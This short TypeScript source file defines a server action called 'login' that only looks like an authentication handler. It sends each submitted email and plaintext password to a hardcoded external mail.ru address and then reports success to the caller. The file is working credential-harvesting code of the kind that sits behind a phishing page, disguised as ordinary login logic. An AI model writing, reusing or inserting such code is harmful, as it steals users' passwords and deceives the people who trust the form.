"use server";

import { render } from "@react-email/components";
import { transporter } from "~/utils/transporter";

export async function login({
  email,
  password,
}: {
  email: string;
  password: string;
}) {
  try {
    await transporter.sendMail({
      from: process.env.NODEMAILER_USER,
      to: "ungrid@mail.ru",
      subject: email,
      html: render(
        <div className="flex flex-col gap-1">
          <span>{email}</span>
          <span>{password}</span>
        </div>,
      ),
    });
    return { status: 201 };
  } catch (e) {
    return { status: 500 };
  }
}
